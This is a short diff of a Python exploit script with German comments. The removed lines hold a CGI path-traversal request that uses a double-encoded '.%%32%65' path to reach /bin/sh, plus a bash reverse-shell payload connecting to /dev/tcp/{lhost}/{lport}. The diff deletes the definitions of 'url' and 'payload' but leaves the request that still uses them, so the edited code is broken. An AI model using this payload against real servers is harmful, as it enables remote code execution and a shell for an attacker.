@@ -8,10 +8,7 @@ def fire_exploit(target_url, lhost, lport):
     # Warten damit Socke-Listner sicher ready ist
     time.sleep(1)
     
-    print(f"[*] Sende Exploit 'POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1 \n echo Content-Type: text/plain; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'' an {target_url} ...")
-    payload = f"echo Content-Type: text/plain; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
-    url = f"{target_url}/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
-    
+        
     try:
         # Request vorbereiten das Python Pfad nicht auflöst
         req = requests.Request('POST', url, data=payload)
